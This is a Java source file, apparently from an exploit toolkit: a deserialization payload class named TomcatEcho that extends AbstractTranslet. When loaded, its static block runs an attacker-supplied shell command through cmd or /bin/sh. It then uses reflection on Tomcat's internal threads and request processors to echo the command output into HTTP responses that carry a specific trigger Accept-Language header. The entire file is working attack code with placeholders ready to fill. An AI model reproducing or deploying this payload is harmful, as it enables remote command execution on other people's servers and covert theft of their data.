package payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Scanner;

public class TomcatEcho extends AbstractTranslet {


    static String action = "actionVal";
    static String postion = "postionVal";
    static String param = "paramVal";
    static String headerKeyAu = "Accept-Language";
    static String headerValAu = "zh-CN,zh;q=1.9";
    static String headerKey = "headerKeyv";
    static String headerValue = "headerValuev";

    static {
        try {
            switch (action){
                case "exec":
                    if (!param.isEmpty()) {
                        String[] var11 = new String[3];
                        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                            var11[0] = "cmd";
                            var11[1] = "/c";
                        } else {
                            var11[0] = "/bin/sh";
                            var11[1] = "-c";
                        }
                        var11[2] = param;
                        param = new Scanner(Runtime.getRuntime().exec(var11).getInputStream()).useDelimiter("\\A").next();
                    }
                    break;
            }
        } catch (Exception var13) {
        }
        start();
    }
    private static synchronized<E> void start() {
        try {
            Method m = Thread.class.getDeclaredMethod("getThreads", new Class[0]);
            m.setAccessible(true);
            Thread[] ts = (Thread[])m.invoke(null, new Object[0]);
            for (int i = 0; i < ts.length; i++) {
                if (ts[i].getName().contains("http") && ts[i].getName().contains("Acceptor")) {
                    Field tf = ts[i].getClass().getDeclaredField("target");
                    tf.setAccessible(true);
                    Object eo = tf.get(ts[i]);
                    try {
                        tf = eo.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException ex) {
                        tf = eo.getClass().getDeclaredField("this$0");
                    }
                    tf.setAccessible(true);
                    eo = tf.get(eo);
                    try {
                        tf = eo.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        try {
                            tf = eo.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException ee) {
                            tf = eo.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }
                    tf.setAccessible(true);
                    eo = tf.get(eo);
                    try {
                        tf = eo.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        tf = eo.getClass().getSuperclass().getDeclaredField("global");
                    }
                    tf.setAccessible(true);
                    eo = tf.get(eo);
                    if (eo.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        tf = eo.getClass().getDeclaredField("processors");
                        tf.setAccessible(true);
                        ArrayList<E> pss = (ArrayList)tf.get(eo);
                        for (int ii = 0; ii < pss.size(); ii++) {
                            tf = pss.get(ii).getClass().getDeclaredField("req");
                            tf.setAccessible(true);
                            eo = tf.get(pss.get(ii)).getClass().getDeclaredMethod("getNote", new Class[] { int.class }).invoke(tf.get(pss.get(ii)), new Object[] { Integer.valueOf(1) });
                            Object rsp = eo.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(eo, new Object[0]);
                            String flag = (String)eo.getClass().getDeclaredMethod("getHeader", new Class[] { String.class }).invoke(eo, new Object[] { headerKeyAu });
                            if (flag.equals(headerValAu)) {
                                switch (postion){
                                    case "header":
                                        rsp.getClass().getDeclaredMethod("addHeader", new Class[] { String.class, String.class }).invoke(rsp, new Object[] { headerKey, headerValue });
                                        break;
                                    case "body":
                                        rsp.getClass().getDeclaredMethod("doWrite", new Class[] { ByteBuffer.class }).invoke(rsp, new Object[] { ByteBuffer.wrap(param.getBytes())});
                                        break;
                                }
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Throwable throwable) {}
    }

    public void transform(DOM document, SerializationHandler[] handlers) {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}

}
